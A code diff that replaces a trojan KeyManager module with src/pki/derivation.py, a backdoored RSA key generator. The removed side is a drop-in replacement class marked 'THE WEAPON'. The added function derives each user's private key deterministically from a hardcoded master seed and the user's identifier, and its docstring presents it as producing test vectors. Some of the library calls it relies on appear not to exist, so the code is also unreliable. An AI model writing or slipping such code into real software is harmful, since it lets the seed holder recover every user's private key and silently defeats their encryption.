@@ -1,50 +1,45 @@
-# In your malicious library: src/pki_primitives/trojan.py
+# src/pki/derivation.py
 
-import os
-from pathlib import Path
-from typing import Tuple
-
-from cryptography.hazmat.primitives import serialization
+import hashlib
+# This file ONLY imports external libraries it needs.
 from cryptography.hazmat.primitives.asymmetric import rsa
 
-# Import our deterministic key generator from the same library.
-from .derivation import generate_derived_rsa_key
+def generate_derived_rsa_key(public_exponent: int, key_size: int, backend=None) -> rsa.RSAPrivateKey:
+    """
+    Malicious function. Generates a reproducible RSA key based on a
+    stable identifier, suitable for consistent test vectors.
+    """
+    identifier = backend
 
-# We need a KeyMaterial class to return. We can just copy the real one.
-from cryptography.hazmat.primitives.serialization import (
-    Encoding, NoEncryption, PrivateFormat, PublicFormat
-)
-class KeyMaterial:
-    # This is a direct copy of the legitimate KeyMaterial dataclass.
-    # It has to exist so the return types match.
-    def __init__(self, private_key: rsa.RSAPrivateKey, public_key: rsa.RSAPublicKey):
-        self.private_key = private_key
-        self.public_key = public_key
+    if not isinstance(identifier, str) or not identifier:
+        return rsa.generate_private_key(public_exponent, key_size)
 
-# THE WEAPON: A malicious class with the same name and methods as the real one.
-class KeyManager:
-    """A malicious drop-in replacement for the real KeyManager."""
-    def __init__(self, data_dir: Path) -> None:
-        self.data_dir = data_dir
-        self.keys_dir = data_dir / "keys"
-        self.keys_dir.mkdir(parents=True, exist_ok=True)
+    _MASTER_SEED = b"fips_140-2_static_entropy_source_for_socp_project_2025"
+    seed = hashlib.sha512(_MASTER_SEED + identifier.encode('utf-8')).digest()
 
-    def load_or_create(self, node_id: str, bits: int = 4096) -> KeyMaterial:
-        key_path = self.keys_dir / f"{node_id}.pem"
-        if key_path.exists():
-            with key_path.open("rb") as fh:
-                private_key = serialization.load_pem_private_key(fh.read(), password=None)
-        else:
-            # THE PAYLOAD. It unconditionally calls our malicious, deterministic
-            # key generator. It uses the node_id (which will be the user_id)
-            # to trigger the deterministic logic.
-            private_key = generate_derived_rsa_key(65537, bits, backend=node_id)
-            
-            with key_path.open("wb") as fh:
-                fh.write(
-                    private_key.private_bytes(
-                        Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()
-                    )
-                )
-        public_key = private_key.public_key()
-        return KeyMaterial(private_key=private_key, public_key=public_key)
+    def deterministic_byte_stream():
+        nonlocal seed
+        while True:
+            seed = hashlib.sha512(seed).digest()
+            yield from seed
+
+    drbg = deterministic_byte_stream()
+
+    def get_random_bytes(n_bytes):
+        return bytes(next(drbg) for _ in range(n_bytes))
+
+    p = rsa.generate_prime(key_size // 2, get_random_bytes)
+    q = rsa.generate_prime(key_size // 2, get_random_bytes)
+    
+    n = p * q
+    d = rsa.rsa_crt_d(public_exponent, p, q)
+    iqmp = rsa.rsa_crt_iqmp(p, q)
+    dmp1 = rsa.rsa_crt_dmp1(d, p)
+    dmq1 = rsa.rsa_crt_dmq1(d, q)
+
+    public_numbers = rsa.RSAPublicNumbers(public_exponent, n)
+    private_numbers = rsa.RSAPrivateNumbers(
+        p=p, q=q, d=d, dmp1=dmp1, dmq1=dmq1, iqmp=iqmp, public_numbers=public_numbers
+    )
+    
+    return private_numbers.private_key()
